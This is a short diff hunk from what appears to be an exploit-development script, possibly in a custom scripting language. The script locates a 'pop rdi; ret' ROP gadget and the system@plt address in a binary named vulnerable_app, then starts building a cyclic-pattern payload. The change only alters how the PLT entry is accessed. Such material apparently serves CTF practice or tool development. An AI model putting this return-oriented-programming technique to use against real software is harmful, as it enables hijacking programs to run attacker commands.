@@ -157,7 +157,7 @@ let binary = "./vulnerable_app"
 
 # Find ROP gadgets
 let pop_rdi = rop_find(binary, "pop rdi; ret")[0]
-let system_plt = analyze(binary)["plt"]["system"]
+let system_plt = analyze(binary).plt.system
 
 # Build payload
 let payload = cyclic(offset)
